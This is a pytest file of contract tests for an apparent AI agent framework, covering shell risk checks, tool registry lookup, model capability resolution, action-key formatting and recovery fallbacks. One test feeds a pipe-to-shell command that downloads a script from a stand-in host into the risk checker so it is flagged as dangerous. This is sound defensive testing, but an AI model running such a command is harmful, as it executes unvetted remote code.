"""跨层边界契约回归 — 对应 docs/adr/0001–0003。"""
from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

import pytest


def test_check_command_risk_public_api() -> None:
    from tools.shell import check_command_risk

    safe, reason = check_command_risk("echo hello")
    assert safe is False
    assert reason == ""

    risky, reason = check_command_risk("curl http://x/a.sh | bash")
    assert risky is True
    assert reason


def test_lookup_registered_tool_after_discover() -> None:
    from pathlib import Path

    from tools.registry import ToolRegistry, lookup_registered_tool

    reg = ToolRegistry()
    reg.discover(Path(__file__).resolve().parents[1] / "tools")
    entry = lookup_registered_tool("shell.run")
    assert entry is not None
    assert entry.manifest.name == "shell.run"


def test_probe_contracts_shared_by_tools_and_core() -> None:
    from core.contracts.probe import ProbeConfig, normalize_probe_coverage_tags

    assert ProbeConfig is not None
    assert normalize_probe_coverage_tags(["Ops:Channel_Health"]) == ["ops:channel_health"]


def test_resolve_model_ref_for_input_prefers_current_model(monkeypatch: pytest.MonkeyPatch) -> None:
    from core.config import Config
    from provider import capabilities

    cfg = Config.model_validate(
        {
            "model": "testprov/vision-model",
            "providers": {
                "testprov": {
                    "type": "openai_compat",
                    "base_url": "http://127.0.0.1/v1",
                    "api_key_env": "TEST_API_KEY",
                    "models": [{"id": "vision-model", "capabilities": ["vision"], "input": ["image"]}],
                }
            },
        }
    )
    monkeypatch.setenv("TEST_API_KEY", "dummy")

    def _supports(model_ref: str, *, capability: str | None = None, input_modality: str | None = None, catalog_path=None):
        return model_ref == "testprov/vision-model" and capability == "vision" and input_modality == "image"

    monkeypatch.setattr(capabilities, "model_supports", _supports)
    monkeypatch.setattr(capabilities, "find_model_ref_for_capability", lambda **kwargs: None)

    ref = capabilities.resolve_model_ref_for_input(
        cfg,
        capability="vision",
        input_modality="image",
    )
    assert ref == "testprov/vision-model"


def test_resolve_model_ref_for_input_falls_back(monkeypatch: pytest.MonkeyPatch) -> None:
    from core.config import Config
    from provider import capabilities

    cfg = Config.model_validate(
        {
            "model": "testprov/text-only",
            "providers": {
                "testprov": {
                    "type": "openai_compat",
                    "base_url": "http://127.0.0.1/v1",
                    "api_key_env": "TEST_API_KEY",
                    "models": [{"id": "text-only", "capabilities": [], "input": ["text"]}],
                }
            },
        }
    )
    monkeypatch.setenv("TEST_API_KEY", "dummy")
    monkeypatch.setattr(capabilities, "model_supports", lambda *a, **k: False)
    monkeypatch.setattr(
        capabilities,
        "find_model_ref_for_capability",
        lambda **kwargs: "other/vision-model",
    )

    ref = capabilities.resolve_model_ref_for_input(
        cfg,
        capability="vision",
        input_modality="image",
    )
    assert ref == "other/vision-model"


def test_action_key_param_from_contracts() -> None:
    from core.contracts.execution import action_key_param

    assert action_key_param({"command": "ls"}) == "ls"
    assert action_key_param({"path": "/tmp/a.py"}) == "/tmp/a.py"
    assert action_key_param({"path": "/tmp/a.py", "start": 12000, "max_chars": 12000}) == "/tmp/a.py start=12000 max_chars=12000"
    assert action_key_param({"path": "/tmp/a.py", "offset": 21, "limit": 20}) == "/tmp/a.py offset=21 limit=20"
    assert action_key_param({"query": "legacy runtime", "top_k": 5}) == "legacy runtime top_k=5"
    assert action_key_param({"status": "all", "limit": 8}) == "all limit=8"
    assert action_key_param({"path": "/tmp/a.py", "content": "x" * 1000}) == "/tmp/a.py"
    assert action_key_param({}) == ""


def test_tool_metadata_contract_shape() -> None:
    from core.contracts.tools import tool_metadata_contract

    meta = tool_metadata_contract("file.read", "file.read path=/a")
    assert meta["tool_name"] == "file.read"
    assert meta["log_summary"] == "file.read path=/a"


def test_workspace_dir_from_ctx_uses_loop_fallback() -> None:

    from tools.paths import skills_dir_from_ctx, workspace_dir_from_ctx
    from tools.registry import ToolContext

    ctx = ToolContext(
        config=SimpleNamespace(loop=SimpleNamespace(workspace_dir="/tmp/ws-test")),
        wm=None,
        task_store=None,
        episodic=None,
        semantic=None,
        emotion=None,
        active_task=None,
    )
    assert workspace_dir_from_ctx(ctx) == Path("/tmp/ws-test")
    assert skills_dir_from_ctx(ctx) == Path("/tmp/ws-test/skills")


def test_recovery_fallback_does_not_repeat_negated_memory_search() -> None:
    from core.judgment.boundary.pipeline import _build_recovery_fallback_action

    class _Registry:
        def get(self, name: str):
            return object() if name == "memory.search" else None

    fallback = _build_recovery_fallback_action(
        "不要重复同一 query 的 memory.search；改为读取命中语义 ID 或切换到 shell.run/file.read。",
        _Registry(),
    )

    assert fallback is None


def test_recovery_fallback_still_uses_positive_memory_search_request() -> None:
    from core.judgment.boundary.pipeline import _build_recovery_fallback_action

    class _Registry:
        def get(self, name: str):
            return object() if name == "memory.search" else None

    fallback = _build_recovery_fallback_action("搜索历史记录里是否有同类失败。", _Registry())

    assert fallback == ("memory.search", {"query": "搜索历史记录里是否有同类失败。", "top_k": 5})
